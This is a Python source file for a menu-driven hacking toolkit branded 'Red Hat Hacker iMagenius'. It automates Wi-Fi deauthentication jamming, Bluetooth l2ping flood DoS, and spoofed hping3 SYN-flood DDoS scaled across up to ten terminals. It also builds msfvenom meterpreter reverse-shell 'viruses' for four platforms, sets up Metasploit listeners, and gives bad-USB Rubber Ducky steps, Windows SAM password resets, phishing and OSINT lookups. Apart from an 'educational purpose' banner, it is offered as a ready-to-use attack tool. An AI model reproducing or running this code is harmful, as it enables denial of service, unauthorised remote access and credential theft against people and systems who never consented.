import pyfiglet
from colorama import Fore, Style
import subprocess
import time
import os 
import re

def display(text, color="GREEN"):
        color_attr = getattr(Fore, color.upper(), Fore.GREEN)
        print(color_attr + text + Style.RESET_ALL)

if os.geteuid() != 0:
    print("______________________________________________\n")
    print(Fore.YELLOW+"[Note] "+Fore.RED+"Run this software with root permission!"+Style.RESET_ALL)
    print("______________________________________________")
    exit()

while 1:
    subprocess.run(["clear"])
    print(pyfiglet.figlet_format("-------------"))
    toolName1 = pyfiglet.figlet_format(" Red Hat Hacker", font="slant")
    toolName2 = pyfiglet.figlet_format("    iMagenius", font="slant")
    print(Fore.RED + toolName1 +Fore.MAGENTA + toolName2 + Style.RESET_ALL)
    print(pyfiglet.figlet_format("-------------"))
    print("_____________________________________________________\n")
    print(Fore.RED+"[Note] "+Fore.YELLOW+"This software is only for educational purpose!"+Style.RESET_ALL)
    print("_____________________________________________________\n\n\n")
    print("----------------------------")
    display("1 - Wifi Hacking","cyan")
    display("2 - Bluetooth Hacking","cyan")
    display("3 - Website Hacking","cyan")
    display("4 - System Hacking","cyan")
    display("5 - Browser Hacking","cyan")
    display("6 - MITM Attack Hacking","cyan")
    display("7 - MAC Address Spoofing","cyan")
    display("8 - Information Gathering","cyan")
    display("9 - Lanuch a Server","cyan")
    display("10 - Advanced Hacking Tools","red")
    display("11 - Exit","cyan")
    print("----------------------------\n")
    option = input(Fore.WHITE+"Select an Option : "+Style.RESET_ALL)

    if option=="1":
        while 1:
            subprocess.run(["clear"])
            print(pyfiglet.figlet_format("============"))
            toolName1 = pyfiglet.figlet_format(" Red Hat Hacker", font="slant")
            toolName2 = pyfiglet.figlet_format("    iMagenius", font="slant")
            print(Fore.GREEN + toolName1 +Fore.RED + toolName2 + Style.RESET_ALL)
            print(pyfiglet.figlet_format("============"))
            print("_________________________________________\n")
            print(Fore.YELLOW+"             Wifi Hacking"+Style.RESET_ALL)
            print("_________________________________________\n\n\n")
            display("1 - Hack Any Wifi","cyan")
            display("2 - Wifi Jammer","cyan")
            display("3 - Make Wifi Hotspot(your own wifi)","cyan")
            display("4 - Reset wifi settings","cyan")
            display("5 - Back\n\n","cyan")
            toolOption = input(Fore.WHITE+"Select an Option : "+Style.RESET_ALL)

            if toolOption=="5":
                break

            if toolOption=="1":
                subprocess.Popen(["x-terminal-emulator", "-e","--title", "Wifi Hacking", "bash", "-c", "wifite;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "800", "600"])

            if toolOption=="4":
                try:
                    subprocess.run(["airmon-ng", "stop", "wlan0mon"], check=True)
                    display("\nWifi settings reset successfully....","green")
                except:
                    pass
                input("\nPress any key to continue...")

            if toolOption=="3":
                ssid = input(Fore.YELLOW+"\nEnter new SSID of your Hotspot : "+Style.RESET_ALL)
                password = input(Fore.YELLOW+"\nEnter new password of your Hotspot : "+Style.RESET_ALL)
                try:
                    subprocess.run(["nmcli", "device", "wifi","hotspot","ifname","wlan0","ssid",ssid,"password",password], check=True)
                    display("\nWifi Hotspot made successfully...","green")
                except:
                    display("\nSSID or password not configured properly!","red")
                input("\nPress any key to continue...")

            if toolOption=="2":
                subprocess.Popen(["x-terminal-emulator", "-e","--title", "Wifi Scanning", "bash", "-c", "airmon-ng start wlan0; airodump-ng wlan0mon;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1) 
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "800", "600"], check=True)
                mac = input(Fore.YELLOW+"\nEnter Mac Address : "+Style.RESET_ALL)
                if not re.match(r"^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$", mac):
                    print(Fore.RED+"\n[Note] "+Fore.YELLOW+"Invalid MAC address. It must be in the format 'xx:xx:xx:xx:xx:xx' (e.g., '00:11:22:33:44:55')."+Style.RESET_ALL)
                    input("\nPress any key to continue...")
                    continue
                ch = input(Fore.YELLOW+"\nEnter Channel : "+Style.RESET_ALL)
                if ch=="":
                    ch = "11"
                subprocess.Popen(["x-terminal-emulator", "-e","--title", "Selecting wifi", "bash", "-c", f"airodump-ng -c {ch} --bssid {mac} wlan0mon;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "600", "400"], check=True)
                time.sleep(1)
                subprocess.Popen(["x-terminal-emulator", "-e","--title", "Jamm Wifi", "bash", "-c", f"aireplay-ng -0 0 -a {mac} wlan0mon;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "400", "300"], check=True)
                print("\n------------------------------------")
                display("\n         Wifi has been Jamm!","red")
                input("\n------------------------------------")

    if option=="2":
            print("")
            subprocess.run(["hciconfig", "hci0", "up"], check=True)
            subprocess.run(["hcitool", "scan"], check=True)
            mac = input(Fore.YELLOW+"\nWrite Mac Address of Device to Hack (Dos Attack) : "+Style.RESET_ALL)
            if not re.match(r"^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$", mac):
                print(Fore.RED+"\n[Note] "+Fore.YELLOW+"Invalid MAC address. It must be in the format 'xx:xx:xx:xx:xx:xx' (e.g., '00:11:22:33:44:55')."+Style.RESET_ALL)
                input("\nPress any key to continue...")
                continue
            subprocess.Popen(["x-terminal-emulator", "-e", "bash", "-c", f"while true; do l2ping -i hci0 -s 1000 -f {mac} ; done;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            time.sleep(1)
            subprocess.run(["xdotool", "getactivewindow", "windowsize", "800", "500"])
            print("\n------------------------------------")
            display("\n         Device is hacked!","red")
            input("\n------------------------------------")

    if option=="3":
        while 1:
            subprocess.run(["clear"])
            print(pyfiglet.figlet_format("============"))
            toolName1 = pyfiglet.figlet_format(" Red Hat Hacker", font="slant")
            toolName2 = pyfiglet.figlet_format("    iMagenius", font="slant")
            print(Fore.GREEN + toolName1 +Fore.RED + toolName2 + Style.RESET_ALL)
            print(pyfiglet.figlet_format("============"))
            print("_________________________________________\n")
            print(Fore.YELLOW+"             Website Hacking "+Style.RESET_ALL)
            print("_________________________________________\n\n\n")
            display("1 - Find all vulnerabilities & waeknesses","cyan")
            display("2 - Phishing Attack","cyan")
            display("3 - Down Website (Ddos attack)","cyan")
            display("4 - Clone Website","cyan")
            display("5 - Back\n\n","cyan")
            toolOption = input(Fore.WHITE+"Select an Option : "+Style.RESET_ALL)

            if toolOption=="1":
                siteName = input(Fore.YELLOW+"\nEnter website name : "+Style.RESET_ALL)
                if siteName=="":
                    break
                subprocess.Popen(["x-terminal-emulator","--title", "Finding vulnerabilities", "-e", "bash", "-c", f"nikto -h {siteName} -o report.html;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "500", "500"])
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"             Done, report will be saved in report.html"+Style.RESET_ALL)
                input("_________________________________________________________________")

            if toolOption=="2":
                subprocess.Popen(["x-terminal-emulator","--title", "Phishing Attack", "-e", "bash", "-c", "setoolkit;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "500", "500"])
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"             Code of phising attack (1,2,3,2)"+Style.RESET_ALL)
                input("_________________________________________________________________")

            if toolOption=="3":
                siteName = input(Fore.YELLOW+"\nEnter website name or server IP : "+Style.RESET_ALL)
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"             1 - Down average website or server"+Style.RESET_ALL)
                print(Fore.RED+"             2 - Down heavy website or server (Dangerous)"+Style.RESET_ALL)
                print("_________________________________________________________________")
                choose = input(Fore.WHITE+"\nSelect an Option (1 recomended): "+Style.RESET_ALL)
                if choose=="1":
                    port = input(Fore.WHITE+"\nEnter port number (80 or 443): "+Style.RESET_ALL)
                    subprocess.Popen(["x-terminal-emulator","--title", "Ddos Attack", "-e", "bash", "-c", f"hping3 --spoof 10.38.10.88 -S -p {port} --flood --rand-source {siteName};  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                    time.sleep(1)
                    subprocess.run(["xdotool", "getactivewindow", "windowsize", "500", "500"])
                    print("\n_________________________________________________________________\n")
                    print(Fore.YELLOW+"             (Want to stop this attack, press CTL+C)"+Style.RESET_ALL)
                    input("_________________________________________________________________")

                if choose=="2":
                    port = input(Fore.WHITE+"\nEnter port number (80 or 443): "+Style.RESET_ALL)
                    power = input(Fore.RED+"\nEnter attack power (1 - 10): "+Style.RESET_ALL)
                    p = int(power)
                    if p>=1 and p<=10:
                        for i in range(p):
                            subprocess.Popen(["x-terminal-emulator","--title", f"Ddos Attack {i+1}", "-e", "bash", "-c", f"hping3 --spoof 10.38.10.88 -S -p {port} --flood --rand-source {siteName};  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                            time.sleep(1)
                            subprocess.run(["xdotool", "getactivewindow", "windowsize", "500", "500"])
                            print("\n_________________________________________________________________\n")
                            print(Fore.YELLOW+"             (Want to stop this attack, press CTL+C)"+Style.RESET_ALL)
                            input("_________________________________________________________________")
            
            if toolOption=="4":
                subprocess.Popen(["x-terminal-emulator","--title", "Cloning", "-e", "bash", "-c", "httrack;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "600", "600"])
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"             Done..."+Style.RESET_ALL)
                input("_________________________________________________________________")

            if toolOption=="5":
                break

    if option=="4":
        while 1:
            subprocess.run(["clear"])
            print(pyfiglet.figlet_format("============"))
            toolName1 = pyfiglet.figlet_format(" Red Hat Hacker", font="slant")
            toolName2 = pyfiglet.figlet_format("    iMagenius", font="slant")
            print(Fore.GREEN + toolName1 +Fore.RED + toolName2 + Style.RESET_ALL)
            print(pyfiglet.figlet_format("============"))
            print("_________________________________________\n")
            print(Fore.YELLOW+"             System Hacking"+Style.RESET_ALL)
            print("_________________________________________\n\n\n")
            display("1 - Rubber Ducky Hacking","cyan")
            display("2 - Generate virus to hack any system","cyan")
            display("3 - Configure Listener","cyan")
            display("4 - Hack any System by scaninng & searching vuln...","cyan")
            display("5 - Hack any windows password","cyan")
            display("6 - Back\n\n","cyan")
            toolOption = input(Fore.WHITE+"Select an Option : "+Style.RESET_ALL)

            if toolOption=="1":
                try:
                    subprocess.run(["systemctl", "start","apache2"], check=True)
                    subprocess.Popen(["x-terminal-emulator","--title", "Rubber Ducky Attack", "-e", "bash", "-c", "setoolkit; exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                    time.sleep(1)
                    subprocess.run(["xdotool", "getactivewindow", "windowsize", "750", "500"])
                    print("\n_______________________________________________________________________________________________\n")
                    print(Fore.YELLOW+"1) Code of rubber ducky attack (1,9,1) and then generate virus"+Style.RESET_ALL)
                    print(Fore.YELLOW+"2) Copy virus and paste it in server apache and run server, rename it to data.txt"+Style.RESET_ALL)
                    subprocess.Popen(["x-terminal-emulator","--title", "Rubber Ducky Code for arduino", "-e", "bash", "-c", "nano rubberDuckyCode.txt;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                    time.sleep(1)
                    subprocess.run(["xdotool", "getactivewindow", "windowsize", "700", "600"])
                    print(Fore.YELLOW+"3) Upload this code in attiny85 (digispark) by arduino IDE (replace your ip), You can change..."+Style.RESET_ALL)
                    print(Fore.YELLOW+"After uploading, plug this bad USB to laptop then automatically start attack\nand your listner will be connect to this laptop remotly..."+Style.RESET_ALL)
                    input("_______________________________________________________________________________________________")
                except:
                    display("\nSomething went wrong!\n","red")
                    input("")

            if toolOption=="2":
                    ip = input(Fore.YELLOW+"\nEnter Your IP : "+Style.RESET_ALL)
                    port = input(Fore.YELLOW+"\nEnter Port Number (4444) : "+Style.RESET_ALL)
                    name = input(Fore.YELLOW+"\nEnter virus name : "+Style.RESET_ALL)  
                    if ip=="" or port=="" or name=="":
                        continue                      
                    print("\n_________________________________________________________________\n")
                    print(Fore.YELLOW+"             1 - Generate Virus for Android"+Style.RESET_ALL)
                    print(Fore.YELLOW+"             2 - Generate Virus for Linux"+Style.RESET_ALL)
                    print(Fore.YELLOW+"             3 - Generate Virus for Mac"+Style.RESET_ALL)
                    print(Fore.YELLOW+"             4 - Generate Virus for Windows"+Style.RESET_ALL)
                    print(Fore.YELLOW+"             5 - Back"+Style.RESET_ALL)
                    print("_________________________________________________________________")
                    target = input(Fore.WHITE+"\nSelect Target : "+Style.RESET_ALL)

                    if target=="":
                        continue

                    if target=="1":
                        subprocess.run(["msfvenom", "-p","android/meterpreter/reverse_tcp",f"LHOST={ip}",f"LPORT={port}","-o",f"{name}.apk"], check=True)
                    
                    if target=="2":
                        subprocess.run(["msfvenom", "-p","linux/x64/meterpreter/reverse_tcp",f"LHOST={ip}",f"LPORT={port}","-f","elf","-o",f"{name}.elf"], check=True)
                    
                    if target=="3":
                        subprocess.run(["msfvenom", "-p","osx/x64/meterpreter/reverse_tcp",f"LHOST={ip}",f"LPORT={port}","-f","macho","-o",f"{name}.macho"], check=True)
                    
                    if target=="4":
                        subprocess.run(["msfvenom", "-p","windows/meterpreter/reverse_tcp",f"LHOST={ip}",f"LPORT={port}","-f","exe","-o",f"{name}.exe"], check=True)
                    
                    if target=="5":
                        continue

                    print("\n_________________________________________________________________\n")
                    print(Fore.YELLOW+"             Virus saved in current directory..."+Style.RESET_ALL)
                    input("_________________________________________________________________")

            if toolOption=="3":
                subprocess.Popen(["x-terminal-emulator","--title", "Listener", "-e", "bash", "-c", "msfconsole;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "600", "500"])
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"These are commands to configure, use 1 by 1:\nuse multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST ip\nset LPORT 4444\nexploit "+Style.RESET_ALL)
                input("_________________________________________________________________")

            if toolOption=="4":
                ip = input(Fore.YELLOW+"\nEnter System IP : "+Style.RESET_ALL)
                subprocess.Popen(["x-terminal-emulator", "--title", "Scanning", "-e", "bash", "-c", f"nmap {ip} --source-port 34343 -sS -sV -O -A -D RND:5; exec bash"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "700", "600"])
                subprocess.Popen(["x-terminal-emulator","--title", "Exploitation", "-e", "bash", "-c", f"msfconsole;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "750", "650"])

            if toolOption=="5":
                print("\n_________________________________________________________________\n")
                print(Fore.YELLOW+"1) Go to this location (/Windows/System32/config) manually\n2) Open terminal there and paste this 'chntpw -i SAM' command\n3) Now you can reset password of any user..."+Style.RESET_ALL)
                input("_________________________________________________________________")

            if toolOption=="6":
                break

    if option=="5":
        print("\n_________________________________________________________________\n")
        print(Fore.YELLOW+"             This option is in under development!"+Style.RESET_ALL)
        input("_________________________________________________________________")

    if option=="6":
        print(Fore.YELLOW + "\n[!] Launching Ettercap GUI..." + Style.RESET_ALL)
        subprocess.run(["ettercap","-G"])

    if option=="7":
            interface = input(Fore.YELLOW+"\nWrite Interface (wlan0) : "+Style.RESET_ALL)
            mac = input(Fore.YELLOW+"\nWrite New MAC Address (xx:xx:xx:xx:xx:xx) : "+Style.RESET_ALL)
            if not re.match(r"^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}$", mac):
                print(Fore.RED+"\n[Note] "+Fore.YELLOW+"Invalid MAC address. It must be in the format 'xx:xx:xx:xx:xx:xx' (e.g., '00:11:22:33:44:55')."+Style.RESET_ALL)
                input("\nPress any key to continue...")
            else:
                try:
                    subprocess.run(["ifconfig", interface, "down"], check=True)
                    subprocess.run(["ifconfig", interface, "hw", "ether", mac], check=True)
                    subprocess.run(["ifconfig", interface, "up"], check=True)

                    subprocess.run(["ifconfig", interface, "down"], check=True)
                    subprocess.run(["ifconfig", interface, "hw", "ether", mac], check=True)
                    subprocess.run(["ifconfig", interface, "up"], check=True)
                    print(Fore.YELLOW + "\n[!] MAC Address has been changed..." + Style.RESET_ALL)
                except:
                    print(Fore.RED + "\n[!] Something went wrong..." + Style.RESET_ALL)
                input("\nPress any key to continue...")
    
    if option=="8":
        #https://github.com/Greyjedix/Profil3r.git
        #sherlock
        name = input(Fore.YELLOW+"\nEnter name : "+Style.RESET_ALL)
        try:
            subprocess.Popen(["x-terminal-emulator","--title", "Getting Information", "-e", "bash", "-c", f"cd Profil3r; python3 profil3r.py -p {name};  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            time.sleep(1)
            subprocess.run(["xdotool", "getactivewindow", "windowsize", "600", "600"])
        except:
            pass
        try:
            subprocess.Popen(["x-terminal-emulator","--title", "Getting Information", "-e", "bash", "-c", f"sherlock -d {name};  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
            time.sleep(1)
            subprocess.run(["xdotool", "getactivewindow", "windowsize", "500", "600"])
        except:
            pass
        print("\n_______________________________________________________________\n")
        print(Fore.YELLOW+"             Please wait to see complete data..."+Style.RESET_ALL)
        input("_______________________________________________________________")

    if option=="9":
        print("\n_______________________________________________________________\n")
        print(Fore.RED+"[Note] "+Fore.YELLOW+"PLease drop all files to this location (/var/www/html/)!"+Style.RESET_ALL)
        print("_______________________________________________________________\n\n")
        choice = input(Fore.GREEN+"Start server (Y/n) : "+Style.RESET_ALL)
        try:
            if choice=="y":
                ip = os.popen("ip addr | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | grep -v '127.0.0.1'").read().strip().split('\n')[0]
                subprocess.run(["systemctl", "start","apache2"], check=True)
                input(Fore.YELLOW+f"\nServer started at {ip} "+Style.RESET_ALL)
            else:
                subprocess.run(["systemctl", "stop","apache2"], check=True)
                input(Fore.YELLOW+"\nServer stop successfully..."+Style.RESET_ALL)
        except:
            display("\nSomething went wrong!\n","red")

    if option=="10":
        while 1:
            subprocess.run(["clear"])
            print(pyfiglet.figlet_format("============"))
            toolName1 = pyfiglet.figlet_format(" Red Hat Hacker", font="slant")
            toolName2 = pyfiglet.figlet_format("    iMagenius", font="slant")
            print(Fore.GREEN + toolName1 +Fore.RED + toolName2 + Style.RESET_ALL)
            print(pyfiglet.figlet_format("============"))
            print("_________________________________________\n")
            print(Fore.YELLOW+"             Adcanced Tools"+Style.RESET_ALL)
            print("_________________________________________\n\n\n")
            display("1 - Nmap (Network Scanner)","cyan")
            display("2 - MSF_Console (Meta Sploit Framework)","cyan")
            display("3 - Setoolkit","cyan")
            display("4 - Burpsuite","cyan")
            display("5 - Wireshark","cyan")
            display("6 - Dark Web (Tor Browser)","red")
            display("7 - Back\n\n","cyan")
            toolOption = input(Fore.WHITE+"Select an Option : "+Style.RESET_ALL)
            if toolOption=="1":
                subprocess.run(["zenmap"])
            if toolOption=="2":
                subprocess.Popen(["x-terminal-emulator","--title", "msfConsole", "-e", "bash", "-c", "msfconsole;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "900", "600"])
            if toolOption=="3":
                subprocess.Popen(["x-terminal-emulator","--title", "Setoolkit", "-e", "bash", "-c", "setoolkit;  exec bash & disown"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
                time.sleep(1)
                subprocess.run(["xdotool", "getactivewindow", "windowsize", "900", "600"])
            if toolOption=="4":
                subprocess.run(["burpsuite"])
            if toolOption=="5":
                subprocess.run(["wireshark"])
            if toolOption=="6":
                try:
                    #subprocess.run(["sudo", "-u", "kali", "torbrowser-launcher"])
                    subprocess.run(["sudo", "-u", "kali", "./start-tor-browser.desktop"])
                except:
                    display("\nSomething went wrong!\n","red")
            if toolOption=="7":
                break
                
    if option=="11":
        print(Fore.GREEN + "\n Good bye..." + Style.RESET_ALL)
        exit()
